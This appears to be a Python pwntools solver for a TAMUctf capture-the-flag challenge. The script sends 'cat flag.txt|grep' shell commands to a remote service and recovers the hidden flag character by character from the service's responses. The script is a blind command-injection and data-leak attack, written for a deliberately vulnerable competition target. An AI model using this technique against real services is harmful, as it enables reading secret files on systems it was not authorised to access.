#!/usr/bin/env python3
from pwn import *
from itertools import permutations

conn = remote('challenges.tamuctf.com',3424)

valid = b''
for l in set(b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_'):
    m = b"cat flag.txt|grep 'gigem{.*"+bytes([l])+b".*}'"
    conn.recv()#print(conn.recv()+m)
    conn.sendline(m)
    invalid = int(conn.recvline())
    #print(invalid)
    if not invalid:
        valid+=bytes([l])
        print(valid)
print(b'Valid characters: '+valid)

flag=b''
for length in range(14):
    for l in valid:
        m = b"cat flag.txt|grep 'gigem{"+flag+bytes([l])+b".*}'"
        conn.recv()#print(conn.recv()+m)
        conn.sendline(m)
        invalid = int(conn.recvline())
        #print(invalid)
        if not invalid:
            flag += bytes([l])
            print(flag)
            break
print(b'flag gigem{'+flag+b'}')
conn.close()
